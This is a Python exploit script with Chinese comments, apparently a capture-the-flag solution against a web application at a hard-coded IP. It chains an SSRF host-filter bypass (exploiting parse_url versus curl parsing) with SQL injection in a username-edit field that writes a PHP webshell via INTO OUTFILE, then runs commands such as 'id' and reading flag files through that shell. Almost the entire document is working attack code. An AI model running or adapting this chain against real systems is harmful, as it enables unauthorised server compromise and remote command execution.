import requests
import random
import string
import time
# Initialize a session
req = requests.Session()
cred = ''.join(random.choices(string.ascii_letters, k=5)) #创建随机的五位账号，密码一样，用户名一样
#PHP 的 parse_url 对于复杂的 URL 解析方式和 curl 的实际请求目标存在差异。
#parse_url("0://user:pass@127.0.0.1:80;motherland.com:80/") 的 host 字段会被解析为 127.0.0.1，但如果你用 http://user:pass@127.0.0.1:80;motherland.com:80/，host 可能是 127.0.0.1 或 motherland.com，具体取决于解析实现。
#curl 实际会把 @ 前面的部分当作认证信息，@ 后面是主机，分号和端口等会被 curl 解析为主机名的一部分或端口。
ssrf = "0://user:pass@127.0.0.1:80;motherland.com:80/" #ssrf执行绕过host的正则过滤
sqli = f"dugisan3rd' UNION ALL SELECT \"<?php system($_GET['cmd']); ?>\", NULL, NULL, NULL, NULL INTO OUTFILE \"/var/www/html/{cred}.php\";-- -"#写入后门php
command = "hostname;id;cat /*flag.txt"
url = "http://83.136.248.90:50624"
#挂burp代理检查报文,而且代理发包一般不会有问题
PROXIES = {'http': 'http://127.0.0.1:8080'}

response = req.post(f"{url}/register.php",headers={'Content-Type': 'application/x-www-form-urlencoded'},data={'name': cred, 'username': cred, 'password': cred},proxies=PROXIES,allow_redirects=False)

if response.status_code == 302:
    response2 = req.post(f"{url}/login.php",headers={'Content-Type': 'application/x-www-form-urlencoded'},data={'username': cred, 'password': cred},proxies=PROXIES,allow_redirects=False)
    if response2.status_code == 302:
        print("Login successful.")
        # 登录成功后，利用代码中的curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        # 这行代码会把你传入的 data 数组自动作为 POST 参数发送到目标 URL，让服务器执行SSRF
        data = {"url": (None, ssrf),"data[action]": (None, "edit"),"data[new_name]": (None, sqli)}
        #执行SSRF，由于源代码注册时 name 字段有过滤，只允许字母和数字，但是修改时没有过滤导致sql注入，所以修改用户名将sql注入写入php后门
        response3 = req.post(f"{url}/communicate.php",proxies=PROXIES, files=data)
        
        if response3.status_code == 200:
            print("Payload sent successfully. Trigger SQLi...")
            req.get(f"{url}/index.php")
            time.sleep(2) #时间太短会报错，传上去也不行，加个延迟

            #命令执行
            shell_url = f"{url}/{cred}.php?cmd={command}"
            response4 = req.get(shell_url, proxies=PROXIES)

            if response4.status_code == 200:

                clean_output = response4.text.replace("\\N", "").strip()
                print(f"Webshell URL: {url}/{cred}.php?cmd={command}")
                print(f"Output:\n\n{clean_output}")
            else:
                print("Oops, Backdoor knock failed")
        else:
            print("Payload develiverd failed")
    else:
        print("Login failed. Response:", response2.text)
else:
    print("Register failed. Response:", response.text)
